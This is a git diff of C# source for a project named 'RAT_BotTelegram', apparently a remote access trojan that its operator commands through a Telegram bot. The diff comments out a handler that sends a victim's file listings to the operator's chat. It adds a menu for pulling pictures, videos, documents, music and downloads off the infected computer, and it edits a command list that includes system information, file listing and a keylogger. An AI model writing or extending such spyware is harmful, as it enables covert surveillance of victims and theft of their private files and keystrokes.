@@ -49,17 +49,6 @@ namespace RAT_BotTelegram {
             switch (message.Text.Split(' ').First()) {
                 //Enviar un inline keyboard con callback
 
-                //  /PC_Info      <Obtiene información de la computadora>
-                //  /PC_ShutDown  <Está en desarrollo>
-                //  /PC_Restart   <Está en desarrollo>
-                //  /Get_Document <Está en desarrollo>
-                //  /Get_Music    <Está en desarrollo>
-                //  /Get_Download <Está en desarrollo>
-                //  /Get_Videos   <Está en desarrollo>
-                //  /Get_Pictures <Está en desarrollo>
-                //  /Get_Desktop  <Está en desarrollo>
-                //  /Get_Key      <Está en desarrollo>
-
                 //  /GetDir_Document <Obtiene toda la lista>
                 //  /GetDir_Music    <Está en desarrollo>
                 //  /GetDir_Download <Está en desarrollo>
@@ -78,76 +67,71 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
 
-                case "/GetDir_Document":
-                    await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
-                    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
-                    //string[] authorsList = authors.Split(", ")
+                //case "/GetDir_Document":
+                //    await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
+                //    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
+                //    //string[] authorsList = authors.Split(", ")
 
 
-                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                        FileInfo info = new FileInfo(file);
-                        Console.WriteLine("File: " + info);
-                        await  Bot.SendTextMessageAsync(config.id, file);
+                //    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
+                //        FileInfo info = new FileInfo(file);
+                //        Console.WriteLine("File: " + info);
+                //        await  Bot.SendTextMessageAsync(config.id, file);
 
-                        //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
-                        //await Bot.SendDocumentAsync(chatId: config.id,);
-                        //await Bot.SendDocumentAsync(
-                        //chatId: callbackQuery.Message.Chat.Id,
-                        //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
-                        //);
+                //        //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
+                //        //await Bot.SendDocumentAsync(chatId: config.id,);
+                //        //await Bot.SendDocumentAsync(
+                //        //chatId: callbackQuery.Message.Chat.Id,
+                //        //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
+                //        //);
 
 
-                        // Do something with the Folder or just add them to a list via nameoflist.add();
+                //        // Do something with the Folder or just add them to a list via nameoflist.add();
 
-                    }
-                    await Bot.SendTextMessageAsync(config.id,"Elija una opción");
+                //    }
+                //    await Bot.SendTextMessageAsync(config.id,"Elija una opción");
+                //    break;
+
+                case "/Get_Files":  // Menú Obtiene archivos
+
+                    var GetFiles = new InlineKeyboardMarkup(new[]{
+                        new []{
+                            InlineKeyboardButton.WithCallbackData(
+                                text:"Get Pictures",
+                                callbackData: "GetPictures"),
+                            InlineKeyboardButton.WithCallbackData(
+                                text:"Get Videos",
+                                callbackData: "GetVideos"),
+                        },new []{
+                            InlineKeyboardButton.WithCallbackData(
+                                text:"Get Documents",
+                                callbackData: "GetDocument"),
+                            InlineKeyboardButton.WithCallbackData(
+                                text:"Get Music",
+                                callbackData: "GetMusic"),
+                        },new []{
+                            InlineKeyboardButton.WithCallbackData(
+                                text:"Get Download",
+                                callbackData: "formato"),
+                        }
+                    });
+
+
+
+
+
+
+                    await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
                     break;
-
-                case "/GetDir_Documentw":
-
-                    var keyboardEjemplo3 = new InlineKeyboardMarkup(new[]
-                    {
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Keyboard",
-                            callbackData: "keyboard"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Reply",
-                            callbackData: "reply"),
-                    },
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Reenviar",
-                            callbackData: "reenviar"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Force reply",
-                            callbackData: "forceReply"),
-                    },
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Texto con formato",
-                            callbackData: "formato"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Video",
-                            callbackData: "video"),
-                    }
-                });
-
-                    await Bot.SendTextMessageAsync(config.id,"Elija una opción",replyMarkup: keyboardEjemplo3);
-                    break;
-
                 //Mensaje por default
                 default:
                     const string usage =
-                  "________________________________\n" +
+                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
                   " * Use the following commands: *\n" +
                   "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
-                  "\n/Status          <Check if the PC is online>" +
+                  "\n/Status                 <Check if the PC is online>" +
                   "\n/Get_Information <get detailed system information>" +
-                  "\n/Get_Files       |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
+                  "\n/Get_Files          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                   "\n/Keylogger       |Menu| <keylogger Options >" +  
                   "\n" +
